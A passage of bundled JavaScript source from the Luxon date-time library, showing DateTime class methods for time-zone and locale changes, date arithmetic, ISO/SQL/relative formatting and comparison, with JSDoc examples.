   * @example DateTime.local(2016).daysInYear //=> 366
   * @example DateTime.local(2013).daysInYear //=> 365
   * @type {number}
   */
  get daysInYear() {
    return this.isValid ? daysInYear(this.year) : NaN;
  }
  /**
   * Returns the number of weeks in this DateTime's year
   * @see https://en.wikipedia.org/wiki/ISO_week_date
   * @example DateTime.local(2004).weeksInWeekYear //=> 53
   * @example DateTime.local(2013).weeksInWeekYear //=> 52
   * @type {number}
   */
  get weeksInWeekYear() {
    return this.isValid ? weeksInWeekYear(this.weekYear) : NaN;
  }
  /**
   * Returns the number of weeks in this DateTime's local week year
   * @example DateTime.local(2020, 6, {locale: 'en-US'}).weeksInLocalWeekYear //=> 52
   * @example DateTime.local(2020, 6, {locale: 'de-DE'}).weeksInLocalWeekYear //=> 53
   * @type {number}
   */
  get weeksInLocalWeekYear() {
    return this.isValid ? weeksInWeekYear(
      this.localWeekYear,
      this.loc.getMinDaysInFirstWeek(),
      this.loc.getStartOfWeek()
    ) : NaN;
  }
  /**
   * Returns the resolved Intl options for this DateTime.
   * This is useful in understanding the behavior of formatting methods
   * @param {Object} opts - the same options as toLocaleString
   * @return {Object}
   */
  resolvedLocaleOptions(opts = {}) {
    const { locale, numberingSystem, calendar } = Formatter.create(
      this.loc.clone(opts),
      opts
    ).resolvedOptions(this);
    return { locale, numberingSystem, outputCalendar: calendar };
  }
  // TRANSFORM
  /**
   * "Set" the DateTime's zone to UTC. Returns a newly-constructed DateTime.
   *
   * Equivalent to {@link DateTime#setZone}('utc')
   * @param {number} [offset=0] - optionally, an offset from UTC in minutes
   * @param {Object} [opts={}] - options to pass to `setZone()`
   * @return {DateTime}
   */
  toUTC(offset2 = 0, opts = {}) {
    return this.setZone(FixedOffsetZone.instance(offset2), opts);
  }
  /**
   * "Set" the DateTime's zone to the host's local zone. Returns a newly-constructed DateTime.
   *
   * Equivalent to `setZone('local')`
   * @return {DateTime}
   */
  toLocal() {
    return this.setZone(Settings.defaultZone);
  }
  /**
   * "Set" the DateTime's zone to specified zone. Returns a newly-constructed DateTime.
   *
   * By default, the setter keeps the underlying time the same (as in, the same timestamp), but the new instance will report different local times and consider DSTs when making computations, as with {@link DateTime#plus}. You may wish to use {@link DateTime#toLocal} and {@link DateTime#toUTC} which provide simple convenience wrappers for commonly used zones.
   * @param {string|Zone} [zone='local'] - a zone identifier. As a string, that can be any IANA zone supported by the host environment, or a fixed-offset name of the form 'UTC+3', or the strings 'local' or 'utc'. You may also supply an instance of a {@link DateTime#Zone} class.
   * @param {Object} opts - options
   * @param {boolean} [opts.keepLocalTime=false] - If true, adjust the underlying time so that the local time stays the same, but in the target zone. You should rarely need this.
   * @return {DateTime}
   */
  setZone(zone, { keepLocalTime = false, keepCalendarTime = false } = {}) {
    zone = normalizeZone(zone, Settings.defaultZone);
    if (zone.equals(this.zone)) {
      return this;
    } else if (!zone.isValid) {
      return DateTime.invalid(unsupportedZone(zone));
    } else {
      let newTS = this.ts;
      if (keepLocalTime || keepCalendarTime) {
        const offsetGuess = zone.offset(this.ts);
        const asObj = this.toObject();
        [newTS] = objToTS(asObj, offsetGuess, zone);
      }
      return clone(this, { ts: newTS, zone });
    }
  }
  /**
   * "Set" the locale, numberingSystem, or outputCalendar. Returns a newly-constructed DateTime.
   * @param {Object} properties - the properties to set
   * @example DateTime.local(2017, 5, 25).reconfigure({ locale: 'en-GB' })
   * @return {DateTime}
   */
  reconfigure({ locale, numberingSystem, outputCalendar } = {}) {
    const loc = this.loc.clone({ locale, numberingSystem, outputCalendar });
    return clone(this, { loc });
  }
  /**
   * "Set" the locale. Returns a newly-constructed DateTime.
   * Just a convenient alias for reconfigure({ locale })
   * @example DateTime.local(2017, 5, 25).setLocale('en-GB')
   * @return {DateTime}
   */
  setLocale(locale) {
    return this.reconfigure({ locale });
  }
  /**
   * "Set" the values of specified units. Returns a newly-constructed DateTime.
   * You can only set units with this method; for "setting" metadata, see {@link DateTime#reconfigure} and {@link DateTime#setZone}.
   *
   * This method also supports setting locale-based week units, i.e. `localWeekday`, `localWeekNumber` and `localWeekYear`.
   * They cannot be mixed with ISO-week units like `weekday`.
   * @param {Object} values - a mapping of units to numbers
   * @example dt.set({ year: 2017 })
   * @example dt.set({ hour: 8, minute: 30 })
   * @example dt.set({ weekday: 5 })
   * @example dt.set({ year: 2005, ordinal: 234 })
   * @return {DateTime}
   */
  set(values) {
    if (!this.isValid) return this;
    const normalized = normalizeObject(values, normalizeUnitWithLocalWeeks);
    const { minDaysInFirstWeek, startOfWeek } = usesLocalWeekValues(normalized, this.loc);
    const settingWeekStuff = !isUndefined(normalized.weekYear) || !isUndefined(normalized.weekNumber) || !isUndefined(normalized.weekday), containsOrdinal = !isUndefined(normalized.ordinal), containsGregorYear = !isUndefined(normalized.year), containsGregorMD = !isUndefined(normalized.month) || !isUndefined(normalized.day), containsGregor = containsGregorYear || containsGregorMD, definiteWeekDef = normalized.weekYear || normalized.weekNumber;
    if ((containsGregor || containsOrdinal) && definiteWeekDef) {
      throw new ConflictingSpecificationError(
        "Can't mix weekYear/weekNumber units with year/month/day or ordinals"
      );
    }
    if (containsGregorMD && containsOrdinal) {
      throw new ConflictingSpecificationError("Can't mix ordinal dates with month/day");
    }
    let mixed;
    if (settingWeekStuff) {
      mixed = weekToGregorian(
        { ...gregorianToWeek(this.c, minDaysInFirstWeek, startOfWeek), ...normalized },
        minDaysInFirstWeek,
        startOfWeek
      );
    } else if (!isUndefined(normalized.ordinal)) {
      mixed = ordinalToGregorian({ ...gregorianToOrdinal(this.c), ...normalized });
    } else {
      mixed = { ...this.toObject(), ...normalized };
      if (isUndefined(normalized.day)) {
        mixed.day = Math.min(daysInMonth(mixed.year, mixed.month), mixed.day);
      }
    }
    const [ts, o] = objToTS(mixed, this.o, this.zone);
    return clone(this, { ts, o });
  }
  /**
   * Add a period of time to this DateTime and return the resulting DateTime
   *
   * Adding hours, minutes, seconds, or milliseconds increases the timestamp by the right number of milliseconds. Adding days, months, or years shifts the calendar, accounting for DSTs and leap years along the way. Thus, `dt.plus({ hours: 24 })` may result in a different time than `dt.plus({ days: 1 })` if there's a DST shift in between.
   * @param {Duration|Object|number} duration - The amount to add. Either a Luxon Duration, a number of milliseconds, the object argument to Duration.fromObject()
   * @example DateTime.now().plus(123) //~> in 123 milliseconds
   * @example DateTime.now().plus({ minutes: 15 }) //~> in 15 minutes
   * @example DateTime.now().plus({ days: 1 }) //~> this time tomorrow
   * @example DateTime.now().plus({ days: -1 }) //~> this time yesterday
   * @example DateTime.now().plus({ hours: 3, minutes: 13 }) //~> in 3 hr, 13 min
   * @example DateTime.now().plus(Duration.fromObject({ hours: 3, minutes: 13 })) //~> in 3 hr, 13 min
   * @return {DateTime}
   */
  plus(duration) {
    if (!this.isValid) return this;
    const dur = Duration.fromDurationLike(duration);
    return clone(this, adjustTime(this, dur));
  }
  /**
   * Subtract a period of time to this DateTime and return the resulting DateTime
   * See {@link DateTime#plus}
   * @param {Duration|Object|number} duration - The amount to subtract. Either a Luxon Duration, a number of milliseconds, the object argument to Duration.fromObject()
   @return {DateTime}
   */
  minus(duration) {
    if (!this.isValid) return this;
    const dur = Duration.fromDurationLike(duration).negate();
    return clone(this, adjustTime(this, dur));
  }
  /**
   * "Set" this DateTime to the beginning of a unit of time.
   * @param {string} unit - The unit to go to the beginning of. Can be 'year', 'quarter', 'month', 'week', 'day', 'hour', 'minute', 'second', or 'millisecond'.
   * @param {Object} opts - options
   * @param {boolean} [opts.useLocaleWeeks=false] - If true, use weeks based on the locale, i.e. use the locale-dependent start of the week
   * @example DateTime.local(2014, 3, 3).startOf('month').toISODate(); //=> '2014-03-01'
   * @example DateTime.local(2014, 3, 3).startOf('year').toISODate(); //=> '2014-01-01'
   * @example DateTime.local(2014, 3, 3).startOf('week').toISODate(); //=> '2014-03-03', weeks always start on Mondays
   * @example DateTime.local(2014, 3, 3, 5, 30).startOf('day').toISOTime(); //=> '00:00.000-05:00'
   * @example DateTime.local(2014, 3, 3, 5, 30).startOf('hour').toISOTime(); //=> '05:00:00.000-05:00'
   * @return {DateTime}
   */
  startOf(unit, { useLocaleWeeks = false } = {}) {
    if (!this.isValid) return this;
    const o = {}, normalizedUnit = Duration.normalizeUnit(unit);
    switch (normalizedUnit) {
      case "years":
        o.month = 1;
      case "quarters":
      case "months":
        o.day = 1;
      case "weeks":
      case "days":
        o.hour = 0;
      case "hours":
        o.minute = 0;
      case "minutes":
        o.second = 0;
      case "seconds":
        o.millisecond = 0;
        break;
    }
    if (normalizedUnit === "weeks") {
      if (useLocaleWeeks) {
        const startOfWeek = this.loc.getStartOfWeek();
        const { weekday } = this;
        if (weekday < startOfWeek) {
          o.weekNumber = this.weekNumber - 1;
        }
        o.weekday = startOfWeek;
      } else {
        o.weekday = 1;
      }
    }
    if (normalizedUnit === "quarters") {
      const q = Math.ceil(this.month / 3);
      o.month = (q - 1) * 3 + 1;
    }
    return this.set(o);
  }
  /**
   * "Set" this DateTime to the end (meaning the last millisecond) of a unit of time
   * @param {string} unit - The unit to go to the end of. Can be 'year', 'quarter', 'month', 'week', 'day', 'hour', 'minute', 'second', or 'millisecond'.
   * @param {Object} opts - options
   * @param {boolean} [opts.useLocaleWeeks=false] - If true, use weeks based on the locale, i.e. use the locale-dependent start of the week
   * @example DateTime.local(2014, 3, 3).endOf('month').toISO(); //=> '2014-03-31T23:59:59.999-05:00'
   * @example DateTime.local(2014, 3, 3).endOf('year').toISO(); //=> '2014-12-31T23:59:59.999-05:00'
   * @example DateTime.local(2014, 3, 3).endOf('week').toISO(); // => '2014-03-09T23:59:59.999-05:00', weeks start on Mondays
   * @example DateTime.local(2014, 3, 3, 5, 30).endOf('day').toISO(); //=> '2014-03-03T23:59:59.999-05:00'
   * @example DateTime.local(2014, 3, 3, 5, 30).endOf('hour').toISO(); //=> '2014-03-03T05:59:59.999-05:00'
   * @return {DateTime}
   */
  endOf(unit, opts) {
    return this.isValid ? this.plus({ [unit]: 1 }).startOf(unit, opts).minus(1) : this;
  }
  // OUTPUT
  /**
   * Returns a string representation of this DateTime formatted according to the specified format string.
   * **You may not want this.** See {@link DateTime#toLocaleString} for a more flexible formatting tool. For a table of tokens and their interpretations, see [here](https://moment.github.io/luxon/#/formatting?id=table-of-tokens).
   * Defaults to en-US if no locale has been specified, regardless of the system's locale.
   * @param {string} fmt - the format string
   * @param {Object} opts - opts to override the configuration options on this DateTime
   * @example DateTime.now().toFormat('yyyy LLL dd') //=> '2017 Apr 22'
   * @example DateTime.now().setLocale('fr').toFormat('yyyy LLL dd') //=> '2017 avr. 22'
   * @example DateTime.now().toFormat('yyyy LLL dd', { locale: "fr" }) //=> '2017 avr. 22'
   * @example DateTime.now().toFormat("HH 'hours and' mm 'minutes'") //=> '20 hours and 55 minutes'
   * @return {string}
   */
  toFormat(fmt, opts = {}) {
    return this.isValid ? Formatter.create(this.loc.redefaultToEN(opts)).formatDateTimeFromString(this, fmt) : INVALID;
  }
  /**
   * Returns a localized string representing this date. Accepts the same options as the Intl.DateTimeFormat constructor and any presets defined by Luxon, such as `DateTime.DATE_FULL` or `DateTime.TIME_SIMPLE`.
   * The exact behavior of this method is browser-specific, but in general it will return an appropriate representation
   * of the DateTime in the assigned locale.
   * Defaults to the system's locale if no locale has been specified
   * @see https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DateTimeFormat
   * @param formatOpts {Object} - Intl.DateTimeFormat constructor options and configuration options
   * @param {Object} opts - opts to override the configuration options on this DateTime
   * @example DateTime.now().toLocaleString(); //=> 4/20/2017
   * @example DateTime.now().setLocale('en-gb').toLocaleString(); //=> '20/04/2017'
   * @example DateTime.now().toLocaleString(DateTime.DATE_FULL); //=> 'April 20, 2017'
   * @example DateTime.now().toLocaleString(DateTime.DATE_FULL, { locale: 'fr' }); //=> '28 aot 2022'
   * @example DateTime.now().toLocaleString(DateTime.TIME_SIMPLE); //=> '11:32 AM'
   * @example DateTime.now().toLocaleString(DateTime.DATETIME_SHORT); //=> '4/20/2017, 11:32 AM'
   * @example DateTime.now().toLocaleString({ weekday: 'long', month: 'long', day: '2-digit' }); //=> 'Thursday, April 20'
   * @example DateTime.now().toLocaleString({ weekday: 'short', month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit' }); //=> 'Thu, Apr 20, 11:27 AM'
   * @example DateTime.now().toLocaleString({ hour: '2-digit', minute: '2-digit', hourCycle: 'h23' }); //=> '11:32'
   * @return {string}
   */
  toLocaleString(formatOpts = DATE_SHORT, opts = {}) {
    return this.isValid ? Formatter.create(this.loc.clone(opts), formatOpts).formatDateTime(this) : INVALID;
  }
  /**
   * Returns an array of format "parts", meaning individual tokens along with metadata. This is allows callers to post-process individual sections of the formatted output.
   * Defaults to the system's locale if no locale has been specified
   * @see https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DateTimeFormat/formatToParts
   * @param opts {Object} - Intl.DateTimeFormat constructor options, same as `toLocaleString`.
   * @example DateTime.now().toLocaleParts(); //=> [
   *                                   //=>   { type: 'day', value: '25' },
   *                                   //=>   { type: 'literal', value: '/' },
   *                                   //=>   { type: 'month', value: '05' },
   *                                   //=>   { type: 'literal', value: '/' },
   *                                   //=>   { type: 'year', value: '1982' }
   *                                   //=> ]
   */
  toLocaleParts(opts = {}) {
    return this.isValid ? Formatter.create(this.loc.clone(opts), opts).formatDateTimeParts(this) : [];
  }
  /**
   * Returns an ISO 8601-compliant string representation of this DateTime
   * @param {Object} opts - options
   * @param {boolean} [opts.suppressMilliseconds=false] - exclude milliseconds from the format if they're 0
   * @param {boolean} [opts.suppressSeconds=false] - exclude seconds from the format if they're 0
   * @param {boolean} [opts.includeOffset=true] - include the offset, such as 'Z' or '-04:00'
   * @param {boolean} [opts.extendedZone=false] - add the time zone format extension
   * @param {string} [opts.format='extended'] - choose between the basic and extended format
   * @example DateTime.utc(1983, 5, 25).toISO() //=> '1982-05-25T00:00:00.000Z'
   * @example DateTime.now().toISO() //=> '2017-04-22T20:47:05.335-04:00'
   * @example DateTime.now().toISO({ includeOffset: false }) //=> '2017-04-22T20:47:05.335'
   * @example DateTime.now().toISO({ format: 'basic' }) //=> '20170422T204705.335-0400'
   * @return {string}
   */
  toISO({
    format = "extended",
    suppressSeconds = false,
    suppressMilliseconds = false,
    includeOffset = true,
    extendedZone = false
  } = {}) {
    if (!this.isValid) {
      return null;
    }
    const ext = format === "extended";
    let c = toISODate(this, ext);
    c += "T";
    c += toISOTime(this, ext, suppressSeconds, suppressMilliseconds, includeOffset, extendedZone);
    return c;
  }
  /**
   * Returns an ISO 8601-compliant string representation of this DateTime's date component
   * @param {Object} opts - options
   * @param {string} [opts.format='extended'] - choose between the basic and extended format
   * @example DateTime.utc(1982, 5, 25).toISODate() //=> '1982-05-25'
   * @example DateTime.utc(1982, 5, 25).toISODate({ format: 'basic' }) //=> '19820525'
   * @return {string}
   */
  toISODate({ format = "extended" } = {}) {
    if (!this.isValid) {
      return null;
    }
    return toISODate(this, format === "extended");
  }
  /**
   * Returns an ISO 8601-compliant string representation of this DateTime's week date
   * @example DateTime.utc(1982, 5, 25).toISOWeekDate() //=> '1982-W21-2'
   * @return {string}
   */
  toISOWeekDate() {
    return toTechFormat(this, "kkkk-'W'WW-c");
  }
  /**
   * Returns an ISO 8601-compliant string representation of this DateTime's time component
   * @param {Object} opts - options
   * @param {boolean} [opts.suppressMilliseconds=false] - exclude milliseconds from the format if they're 0
   * @param {boolean} [opts.suppressSeconds=false] - exclude seconds from the format if they're 0
   * @param {boolean} [opts.includeOffset=true] - include the offset, such as 'Z' or '-04:00'
   * @param {boolean} [opts.extendedZone=true] - add the time zone format extension
   * @param {boolean} [opts.includePrefix=false] - include the `T` prefix
   * @param {string} [opts.format='extended'] - choose between the basic and extended format
   * @example DateTime.utc().set({ hour: 7, minute: 34 }).toISOTime() //=> '07:34:19.361Z'
   * @example DateTime.utc().set({ hour: 7, minute: 34, seconds: 0, milliseconds: 0 }).toISOTime({ suppressSeconds: true }) //=> '07:34Z'
   * @example DateTime.utc().set({ hour: 7, minute: 34 }).toISOTime({ format: 'basic' }) //=> '073419.361Z'
   * @example DateTime.utc().set({ hour: 7, minute: 34 }).toISOTime({ includePrefix: true }) //=> 'T07:34:19.361Z'
   * @return {string}
   */
  toISOTime({
    suppressMilliseconds = false,
    suppressSeconds = false,
    includeOffset = true,
    includePrefix = false,
    extendedZone = false,
    format = "extended"
  } = {}) {
    if (!this.isValid) {
      return null;
    }
    let c = includePrefix ? "T" : "";
    return c + toISOTime(
      this,
      format === "extended",
      suppressSeconds,
      suppressMilliseconds,
      includeOffset,
      extendedZone
    );
  }
  /**
   * Returns an RFC 2822-compatible string representation of this DateTime
   * @example DateTime.utc(2014, 7, 13).toRFC2822() //=> 'Sun, 13 Jul 2014 00:00:00 +0000'
   * @example DateTime.local(2014, 7, 13).toRFC2822() //=> 'Sun, 13 Jul 2014 00:00:00 -0400'
   * @return {string}
   */
  toRFC2822() {
    return toTechFormat(this, "EEE, dd LLL yyyy HH:mm:ss ZZZ", false);
  }
  /**
   * Returns a string representation of this DateTime appropriate for use in HTTP headers. The output is always expressed in GMT.
   * Specifically, the string conforms to RFC 1123.
   * @see https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.3.1
   * @example DateTime.utc(2014, 7, 13).toHTTP() //=> 'Sun, 13 Jul 2014 00:00:00 GMT'
   * @example DateTime.utc(2014, 7, 13, 19).toHTTP() //=> 'Sun, 13 Jul 2014 19:00:00 GMT'
   * @return {string}
   */
  toHTTP() {
    return toTechFormat(this.toUTC(), "EEE, dd LLL yyyy HH:mm:ss 'GMT'");
  }
  /**
   * Returns a string representation of this DateTime appropriate for use in SQL Date
   * @example DateTime.utc(2014, 7, 13).toSQLDate() //=> '2014-07-13'
   * @return {string}
   */
  toSQLDate() {
    if (!this.isValid) {
      return null;
    }
    return toISODate(this, true);
  }
  /**
   * Returns a string representation of this DateTime appropriate for use in SQL Time
   * @param {Object} opts - options
   * @param {boolean} [opts.includeZone=false] - include the zone, such as 'America/New_York'. Overrides includeOffset.
   * @param {boolean} [opts.includeOffset=true] - include the offset, such as 'Z' or '-04:00'
   * @param {boolean} [opts.includeOffsetSpace=true] - include the space between the time and the offset, such as '05:15:16.345 -04:00'
   * @example DateTime.utc().toSQL() //=> '05:15:16.345'
   * @example DateTime.now().toSQL() //=> '05:15:16.345 -04:00'
   * @example DateTime.now().toSQL({ includeOffset: false }) //=> '05:15:16.345'
   * @example DateTime.now().toSQL({ includeZone: false }) //=> '05:15:16.345 America/New_York'
   * @return {string}
   */
  toSQLTime({ includeOffset = true, includeZone = false, includeOffsetSpace = true } = {}) {
    let fmt = "HH:mm:ss.SSS";
    if (includeZone || includeOffset) {
      if (includeOffsetSpace) {
        fmt += " ";
      }
      if (includeZone) {
        fmt += "z";
      } else if (includeOffset) {
        fmt += "ZZ";
      }
    }
    return toTechFormat(this, fmt, true);
  }
  /**
   * Returns a string representation of this DateTime appropriate for use in SQL DateTime
   * @param {Object} opts - options
   * @param {boolean} [opts.includeZone=false] - include the zone, such as 'America/New_York'. Overrides includeOffset.
   * @param {boolean} [opts.includeOffset=true] - include the offset, such as 'Z' or '-04:00'
   * @param {boolean} [opts.includeOffsetSpace=true] - include the space between the time and the offset, such as '05:15:16.345 -04:00'
   * @example DateTime.utc(2014, 7, 13).toSQL() //=> '2014-07-13 00:00:00.000 Z'
   * @example DateTime.local(2014, 7, 13).toSQL() //=> '2014-07-13 00:00:00.000 -04:00'
   * @example DateTime.local(2014, 7, 13).toSQL({ includeOffset: false }) //=> '2014-07-13 00:00:00.000'
   * @example DateTime.local(2014, 7, 13).toSQL({ includeZone: true }) //=> '2014-07-13 00:00:00.000 America/New_York'
   * @return {string}
   */
  toSQL(opts = {}) {
    if (!this.isValid) {
      return null;
    }
    return `${this.toSQLDate()} ${this.toSQLTime(opts)}`;
  }
  /**
   * Returns a string representation of this DateTime appropriate for debugging
   * @return {string}
   */
  toString() {
    return this.isValid ? this.toISO() : INVALID;
  }
  /**
   * Returns a string representation of this DateTime appropriate for the REPL.
   * @return {string}
   */
  [Symbol.for("nodejs.util.inspect.custom")]() {
    if (this.isValid) {
      return `DateTime { ts: ${this.toISO()}, zone: ${this.zone.name}, locale: ${this.locale} }`;
    } else {
      return `DateTime { Invalid, reason: ${this.invalidReason} }`;
    }
  }
  /**
   * Returns the epoch milliseconds of this DateTime. Alias of {@link DateTime#toMillis}
   * @return {number}
   */
  valueOf() {
    return this.toMillis();
  }
  /**
   * Returns the epoch milliseconds of this DateTime.
   * @return {number}
   */
  toMillis() {
    return this.isValid ? this.ts : NaN;
  }
  /**
   * Returns the epoch seconds of this DateTime.
   * @return {number}
   */
  toSeconds() {
    return this.isValid ? this.ts / 1e3 : NaN;
  }
  /**
   * Returns the epoch seconds (as a whole number) of this DateTime.
   * @return {number}
   */
  toUnixInteger() {
    return this.isValid ? Math.floor(this.ts / 1e3) : NaN;
  }
  /**
   * Returns an ISO 8601 representation of this DateTime appropriate for use in JSON.
   * @return {string}
   */
  toJSON() {
    return this.toISO();
  }
  /**
   * Returns a BSON serializable equivalent to this DateTime.
   * @return {Date}
   */
  toBSON() {
    return this.toJSDate();
  }
  /**
   * Returns a JavaScript object with this DateTime's year, month, day, and so on.
   * @param opts - options for generating the object
   * @param {boolean} [opts.includeConfig=false] - include configuration attributes in the output
   * @example DateTime.now().toObject() //=> { year: 2017, month: 4, day: 22, hour: 20, minute: 49, second: 42, millisecond: 268 }
   * @return {Object}
   */
  toObject(opts = {}) {
    if (!this.isValid) return {};
    const base = { ...this.c };
    if (opts.includeConfig) {
      base.outputCalendar = this.outputCalendar;
      base.numberingSystem = this.loc.numberingSystem;
      base.locale = this.loc.locale;
    }
    return base;
  }
  /**
   * Returns a JavaScript Date equivalent to this DateTime.
   * @return {Date}
   */
  toJSDate() {
    return new Date(this.isValid ? this.ts : NaN);
  }
  // COMPARE
  /**
   * Return the difference between two DateTimes as a Duration.
   * @param {DateTime} otherDateTime - the DateTime to compare this one to
   * @param {string|string[]} [unit=['milliseconds']] - the unit or array of units (such as 'hours' or 'days') to include in the duration.
   * @param {Object} opts - options that affect the creation of the Duration
   * @param {string} [opts.conversionAccuracy='casual'] - the conversion system to use
   * @example
   * var i1 = DateTime.fromISO('1982-05-25T09:45'),
   *     i2 = DateTime.fromISO('1983-10-14T10:30');
   * i2.diff(i1).toObject() //=> { milliseconds: 43807500000 }
   * i2.diff(i1, 'hours').toObject() //=> { hours: 12168.75 }
   * i2.diff(i1, ['months', 'days']).toObject() //=> { months: 16, days: 19.03125 }
   * i2.diff(i1, ['months', 'days', 'hours']).toObject() //=> { months: 16, days: 19, hours: 0.75 }
   * @return {Duration}
   */
  diff(otherDateTime, unit = "milliseconds", opts = {}) {
    if (!this.isValid || !otherDateTime.isValid) {
      return Duration.invalid("created by diffing an invalid DateTime");
    }
    const durOpts = { locale: this.locale, numberingSystem: this.numberingSystem, ...opts };
    const units = maybeArray(unit).map(Duration.normalizeUnit), otherIsLater = otherDateTime.valueOf() > this.valueOf(), earlier = otherIsLater ? this : otherDateTime, later = otherIsLater ? otherDateTime : this, diffed = diff(earlier, later, units, durOpts);
    return otherIsLater ? diffed.negate() : diffed;
  }
  /**
   * Return the difference between this DateTime and right now.
   * See {@link DateTime#diff}
   * @param {string|string[]} [unit=['milliseconds']] - the unit or units units (such as 'hours' or 'days') to include in the duration
   * @param {Object} opts - options that affect the creation of the Duration
   * @param {string} [opts.conversionAccuracy='casual'] - the conversion system to use
   * @return {Duration}
   */
  diffNow(unit = "milliseconds", opts = {}) {
    return this.diff(DateTime.now(), unit, opts);
  }
  /**
   * Return an Interval spanning between this DateTime and another DateTime
   * @param {DateTime} otherDateTime - the other end point of the Interval
   * @return {Interval}
   */
  until(otherDateTime) {
    return this.isValid ? Interval.fromDateTimes(this, otherDateTime) : this;
  }
  /**
   * Return whether this DateTime is in the same unit of time as another DateTime.
   * Higher-order units must also be identical for this function to return `true`.
   * Note that time zones are **ignored** in this comparison, which compares the **local** calendar time. Use {@link DateTime#setZone} to convert one of the dates if needed.
   * @param {DateTime} otherDateTime - the other DateTime
   * @param {string} unit - the unit of time to check sameness on
   * @param {Object} opts - options
   * @param {boolean} [opts.useLocaleWeeks=false] - If true, use weeks based on the locale, i.e. use the locale-dependent start of the week; only the locale of this DateTime is used
   * @example DateTime.now().hasSame(otherDT, 'day'); //~> true if otherDT is in the same current calendar day
   * @return {boolean}
   */
  hasSame(otherDateTime, unit, opts) {
    if (!this.isValid) return false;
    const inputMs = otherDateTime.valueOf();
    const adjustedToZone = this.setZone(otherDateTime.zone, { keepLocalTime: true });
    return adjustedToZone.startOf(unit, opts) <= inputMs && inputMs <= adjustedToZone.endOf(unit, opts);
  }
  /**
   * Equality check
   * Two DateTimes are equal if and only if they represent the same millisecond, have the same zone and location, and are both valid.
   * To compare just the millisecond values, use `+dt1 === +dt2`.
   * @param {DateTime} other - the other DateTime
   * @return {boolean}
   */
  equals(other) {
    return this.isValid && other.isValid && this.valueOf() === other.valueOf() && this.zone.equals(other.zone) && this.loc.equals(other.loc);
  }
  /**
   * Returns a string representation of a this time relative to now, such as "in two days". Can only internationalize if your
   * platform supports Intl.RelativeTimeFormat. Rounds down by default.
   * @param {Object} options - options that affect the output
   * @param {DateTime} [options.base=DateTime.now()] - the DateTime to use as the basis to which this time is compared. Defaults to now.
   * @param {string} [options.style="long"] - the style of units, must be "long", "short", or "narrow"
   * @param {string|string[]} options.unit - use a specific unit or array of units; if omitted, or an array, the method will pick the best unit. Use an array or one of "years", "quarters", "months", "weeks", "days", "hours", "minutes", or "seconds"
   * @param {boolean} [options.round=true] - whether to round the numbers in the output.
   * @param {number} [options.padding=0] - padding in milliseconds. This allows you to round up the result if it fits inside the threshold. Don't use in combination with {round: false} because the decimal output will include the padding.
   * @param {string} options.locale - override the locale of this DateTime
   * @param {string} options.numberingSystem - override the numberingSystem of this DateTime. The Intl system may choose not to honor this
   * @example DateTime.now().plus({ days: 1 }).toRelative() //=> "in 1 day"
   * @example DateTime.now().setLocale("es").toRelative({ days: 1 }) //=> "dentro de 1 da"
   * @example DateTime.now().plus({ days: 1 }).toRelative({ locale: "fr" }) //=> "dans 23 heures"
   * @example DateTime.now().minus({ days: 2 }).toRelative() //=> "2 days ago"
   * @example DateTime.now().minus({ days: 2 }).toRelative({ unit: "hours" }) //=> "48 hours ago"
   * @example DateTime.now().minus({ hours: 36 }).toRelative({ round: false }) //=> "1.5 days ago"
   */
  toRelative(options = {}) {
    if (!this.isValid) return null;
    const base = options.base || DateTime.fromObject({}, { zone: this.zone }), padding = options.padding ? this < base ? -options.padding : options.padding : 0;
    let units = ["years", "months", "days", "hours", "minutes", "seconds"];
    let unit = options.unit;
    if (Array.isArray(options.unit)) {
      units = options.unit;
      unit = void 0;
    }
    return diffRelative(base, this.plus(padding), {
      ...options,
      numeric: "always",
      units,
      unit
    });
  }
  /**
   * Returns a string representation of this date relative to today, such as "yesterday" or "next month".
   * Only internationalizes on platforms that supports Intl.RelativeTimeFormat.
   * @param {Object} options - options that affect the output
   * @param {DateTime} [options.base=DateTime.now()] - the DateTime to use as the basis to which this time is compared. Defaults to now.
   * @param {string} options.locale - override the locale of this DateTime
   * @param {string} options.unit - use a specific unit; if omitted, the method will pick the unit. Use one of "years", "quarters", "months", "weeks", or "days"
   * @param {string} options.numberingSystem - override the numberingSystem of this DateTime. The Intl system may choose not to honor this
   * @example DateTime.now().plus({ days: 1 }).toRelativeCalendar() //=> "tomorrow"
   * @example DateTime.now().setLocale("es").plus({ days: 1 }).toRelative() //=> ""maana"
   * @example DateTime.now().plus({ days: 1 }).toRelativeCalendar({ locale: "fr" }) //=> "demain"
   * @example DateTime.now().minus({ days: 2 }).toRelativeCalendar() //=> "2 days ago"
   */
  toRelativeCalendar(options = {}) {
    if (!this.isValid) return null;
    return diffRelative(options.base || DateTime.fromObject({}, { zone: this.zone }), this, {
      ...options,
      numeric: "auto",
      units: ["years", "months", "days"],
      calendary: true
    });
  }
  /**
   * Return the min of several date times
   * @param {...DateTime} dateTimes - the DateTimes from which to choose the minimum
   * @return {DateTime} the min DateTime, or undefined if called with no argument
   */
  static min(...dateTimes) {
    if (!dateTimes.every(DateTime.isDateTime)) {
      throw new InvalidArgumentError("min requires all arguments be DateTimes");
    }
    return bestBy(dateTimes, (i2) => i2.valueOf(), Math.min);
  }
  /**
   * Return the max of several date times
   * @param {...DateTime} dateTimes - the DateTimes from which to choose the maximum
   * @return {DateTime} the max DateTime, or undefined if called with no argument
   */
  static max(...dateTimes) {
    if (!dateTimes.every(DateTime.isDateTime)) {
      throw new InvalidArgumentError("max requires all arguments be DateTimes");
    }
    return bestBy(dateTimes, (i2) => i2.valueOf(), Math.max);
  }
  // MISC
  /**
   * Explain how a string would be parsed by fromFormat()
   * @param {string} text - the string to parse
   * @param {string} fmt - the format the string is expected to be in (see description)
   * @param {Object} options - options taken by fromFormat()
   * @return {Object}
   */
  static fromFormatExplain(text, fmt, options = {}) {
    const { locale = null, numberingSystem = null } = options, localeToUse = Locale.fromOpts({
      locale,
      numberingSystem,
      defaultToEN: true
    });
    return explainFromTokens(localeToUse, text, fmt);
  }
  /**
   * @deprecated use fromFormatExplain instead
   */
  static fromStringExplain(text, fmt, options = {}) {
    return DateTime.fromFormatExplain(text, fmt, options);
  }
  /**
   * Build a parser for `fmt` using the given locale. This parser can be passed
   * to {@link DateTime.fromFormatParser} to a parse a date in this format. This
   * can be used to optimize cases where many dates need to be parsed in a
   * specific format.
   *
   * @param {String} fmt - the format the string is expected to be in (see
   * description)
   * @param {Object} options - options used to set locale and numberingSystem
   * for parser
